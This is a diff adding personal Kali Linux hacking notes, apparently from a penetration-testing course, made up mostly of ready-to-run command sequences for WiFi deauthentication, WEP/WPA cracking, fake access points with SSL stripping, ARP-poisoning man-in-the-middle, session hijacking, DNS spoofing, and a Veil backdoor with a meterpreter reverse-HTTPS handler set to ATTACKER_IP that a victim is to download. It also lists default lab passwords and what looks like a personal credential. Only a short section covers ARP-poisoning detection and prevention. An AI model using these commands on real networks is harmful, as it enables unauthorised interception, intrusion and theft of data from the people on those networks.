@@ -1,0 +1,244 @@
+Kali Linux
+==========
+username: root
+password: toor
+http://www.mediacollege.com/linux/command/linux-command.html
+
+Basics Command
+==============
+ls <<< list all file
+man ls || ls --help <<< list help for ls
+ifconfig <<< check interface
+
+Update
+======
+apt-get update
+apt-get install "package name"
+apt-get install terminator
+apt-get upgrade
+
+MAC Address
+===========
+iwconfig
+ifconfig wlan0 down
+macchange --random wlan0
+ifcondig wlan0 up
+
+ifconfig [INTERFACE] down
+macchanger -m [MAC][INTERFACE]
+macchange --random [INTERFACE]
+ifconfig [INTERFACE] up
+
+Sniffing
+========
+
+First
+-----
+airmon-ng start [INTERFACE]
+airodump-ng [INTERFACE]
+airmon-ng stop [INTERFACE]
+service network-manager restart <<< to connect back wifi
+
+Second
+------
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig wlan0
+airodump-ng wlan0
+
+
+Third
+-----
+ifconfig wlan0 down
+airmon-ng check kill
+airmon-ng start wlan0
+
+airodump-ng --channel [channel] --bssid [bssid] --write [filename][interface]
+airodump-ng --channel 6 --bsid 11:22:33:44:55:66 --write out wlan0mon
+
+(1C:5F:2B:37:32:F0)
+
+Deauthentication Attacks
+========================
+To de-authenticate all clients in a specific network
+aireplay-ng --deauth [number of packets] -a [AP][INTERFACE]
+aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 wlan0mon
+
+aireplay-ng --deauth [number of packets] -a[AP] -c [TARGET][INTERFACE]
+aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 wlan0mon
+
+Create fake access point
+========================
+start-noupstream <<< starts an AP with NO internet connection
+start-nat-simple <<< this starts a regular AP using internet connection in the upstream interface
+start-nat-full <<< starts AP with internet connection, it also starts sslstrip, sslsplit, firelamp and attempts to bypass HSTS
+
+apt-get install mana-toolkit
+leafpad /etc/mana-toolkit/hostapd-mana.conf
+gedit /etc/mana-toolkit/hostapd-mana.conf
+gedit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh [OR DOWN LINE]
+./usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+
+WEP Cracking
+============
+WHEN MANY PACKETS
+airodump --channel [channel] --bssid [bssid] --write [file-name] [interface]
+aircrack-ng out-01.cap
+
+WHEN LITTLE OR NO PACKET
+airodump --channel [channel] --bssid [bssid] --write [file-name] [interface]
+aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [INTERFACE]
+aireply-ng --arpreplay -b [target MAC] -h [your MAC] [INTERFACE]
+aircrack-ng out-01.cap
+
+WPA Cracking
+============
+wash -i wlan0mon
+reaver -b [target MAC] -c [CHANNEL] -i [INTERFACE]
+
+OR
+
+airodump --channel [channel] --bssid [bssid] --write [file-name] [interface]
+aireplay-ng --deauth [number of packets] -a [AP] [INTERFACE]
+crunch [min] [max] [characters] -t [pattern] -o file
+crunch 4 6 123ab -o sample-wordlist
+cat sample-wordlist
+aricrack-ng [HANDSKAKE FILE] -w [WORDLIST]
+aircrack-ng is-01.cap -w worldlist
+
+Manual Scan Network
+===================
+netdiscover -i wlan0
+netdiscover -i wlan0 -r 192.168.0.1/24
+
+AutoScan-Network
+================
+dpkg --add-architecture i386 <<< 32bit compiler
+apt-get update
+apt-get install libc6:i386
+
+APPLE DEFAULT JAILBREAK PASSWORD
+================================
+ssh root@192.168.1.1
+password: alpine
+
+
+Man in the middle attack - ARP Poisoning
+========================================
+arpspoof -i [interface] -t [target IP] [AP IP] < Tell the target client i am the router
+arpspoof -i wlan0 -t 192.168.0.198 192.168.0.1
+
+arpspoof -i [interface] -t [target IP] [AP IP] < Tell the AP that i am the target client
+arpspoof -i wlan0 -t 192.168.0.1 192.168.0.198
+
+echo 1 > /proc/sys/net/ipv4/ip_forward <<< to ensure packets does not drop when come to us
+
+Man in the middle attack framework
+==================================
+apt-get install mitmf
+
+mitmf --arp --spoof --gateway [gateway IP] --target[s] [TARGET IPs] -i [INTERFACE]
+mitmf --arp --spoof --gateway 10.20.14.1 --target 10.20.14.206 -i wlan0
+mitmf --arp --spoof --gateway 192.168.0.1 --target 192.168.0.198 -i wlan0
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Session Hijacking
+=================
+(Preferred) Disabled devices > network > connect network adapters and connect only wireless || Use ARP Poisoning + Session Hijacking for external devices
+mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0
+apt-get install ferret-sidejack
+ferret -i [INTERFACE]
+hamster
+
+DNS Spoofing
+============
+service apache2 start
+go to files /var/www/html/
+
+leafpad /etc/mitmf/mitmf.conf
+mitmf --arp --spoof --gateway [GATEWAY IP] --target[s] [TARGET IP] -i eth0 --dns
+mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --dns
+
+
+MITMF --help
+------------
+pip install Twisted==15.5.0 <<< This solved mitmf plugin errors
+mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --screen --interval 10
+
+ARP Poisoning Detection
+=======================
+1. arp -a "check mac address"
+2. XARP tools <<< run as administrator
+3. wireshark edit > preferences > protocols > arp > tick detect arp request storms && Analyze > Expert Information > Check Warn Duplicate IP
+
+ARP Poisoning Prevention
+========================
+1. Make ARP Table all into static <<< Not flexisble, changes is needed each time new devices connected to the network
+
+Nexpose
+=======
+1. Download it
+2. service postgresql stop <<< Stop postgresql
+3. chmod +x [installer file name] <<< Change permissions to executable
+4. ./[installer file name] <<< Run installer
+To run it after install cd /opt/rapid7/nexpose/nsc and then ./nsc.sh
+kenowong Sheng12#
+
+Veil
+====
+1. Download it into /opt
+2. Run setup /Veil/setup ./setup.sh
+3. Run Veil /Veil ./Veil.py
+
+list << list available tools (Evasion - undetectable backdoors, Ordance - generate payload for evasion)
+
+for rev_https
+go/meterpreter/rev_https, port 8080 <<< no need type, reference only
+Split > msfconsole > use exploit/multi/handler > 
+set PAYLOAD windows/meterpreter/rev_https
+set LHOST ATTACKER_IP
+set LPORT 8080
+exploit
+
+copy the generate veil into var/www/html
+service apache2 start
+go to victim pc and surf the ip to download it and launch
+
+
+======================================
+Server side attack - few didn't record
+======================================
+
+Windows 10
+==========
+IEUser
+Passw0rd!
+
+
+==============
+Metasploitable
+==============
+username: msfadmin
+password: msfadmin
+command: sudo poweroff
+
+msfconsole - runs the metasploit console
+help - shows help
+show [something] - something can be exploits, payloads, auxiliaries or options
+use [something] - use a certain exploit, payload or auxiliary
+set [option] [value] - configure [option] to have a value of [value]
+exploit - runs the current task
+
+Metasploit Community
+--------------------
+sudo /opt/metasploit/ctlscript.sh start
+service metasploit start
+
+1. Download it
+2. chmod +x [installer file name] - change permissions to executable
+3. ./[installer file name] - run installer
+4. service metasploit start
+5. Navigate to https://localhost:3790 and enter your product key
